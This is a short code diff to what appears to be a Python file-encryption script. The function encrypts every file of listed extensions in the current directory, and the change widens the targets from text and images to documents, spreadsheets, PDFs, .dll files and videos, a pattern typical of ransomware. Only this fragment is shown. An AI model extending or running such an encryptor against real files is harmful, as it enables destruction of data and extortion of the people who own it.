@@ -36,7 +36,8 @@ def load_encryption_key():
     return key
 
 #function to encrypt all given file extensions in the current directory
-ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.jpeg', '.png'}
+ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.jpeg', '.png', '.docx', '.xlsx', '.pdf', '.dll', '.mp4', '.webp'}
+
 
 def encrypt_files():
     key = load_encryption_key()
